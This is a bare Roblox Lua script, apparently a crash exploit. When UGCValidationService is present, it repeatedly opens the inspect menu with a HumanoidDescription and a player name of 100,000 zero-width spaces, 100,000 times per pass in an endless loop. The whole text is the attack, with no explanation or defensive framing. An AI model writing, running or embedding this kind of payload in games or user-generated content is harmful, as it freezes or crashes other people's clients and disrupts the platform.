local GuiService = game:GetService("GuiService")

task.spawn(function()
	while true do
		if game:FindService("UGCValidationService") then
			for i = 1, 1e5 do
				local Lol = Instance.new("HumanoidDescription")
				Lol.FaceAccessory = "0"
				GuiService.CloseInspectMenu(GuiService)
				GuiService.InspectPlayerFromHumanoidDescription(GuiService, Lol, string.rep(utf8.char(8203), 1e5) .. "")
			end
		end
		task.wait(1.5)
	end
end)